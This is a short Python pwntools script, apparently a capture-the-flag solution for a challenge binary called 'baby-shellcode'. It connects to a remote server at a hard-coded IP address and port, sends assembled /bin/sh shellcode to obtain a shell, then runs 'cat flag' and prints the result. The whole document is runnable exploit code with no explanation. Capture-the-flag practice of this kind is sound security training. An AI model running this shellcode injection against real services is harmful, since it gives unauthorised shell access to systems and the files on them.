from pwn import *
exe = context.binary = ELF('baby-shellcode')
io = remote('34.28.147.7', 5000)
io.sendline(asm(shellcraft.sh()))
io.sendline('cat flag')
print(io.recvline())